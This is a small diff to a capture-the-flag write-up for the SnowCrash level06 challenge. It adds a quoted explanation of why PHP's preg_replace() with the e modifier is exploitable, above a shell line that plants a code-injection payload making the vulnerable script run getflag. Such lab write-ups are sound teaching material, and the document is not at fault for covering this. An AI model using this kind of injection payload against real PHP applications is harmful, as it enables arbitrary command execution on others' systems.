@@ -6,6 +6,8 @@
 
 ## Solution
 
+"If the above example was written with preg_replace() and the e modifier, the code could be easily exploited by passing in a string"
+
 ```
 level06@SnowCrash:~$ echo '[x {${`getflag`}}]' > /tmp/getflag
 ```
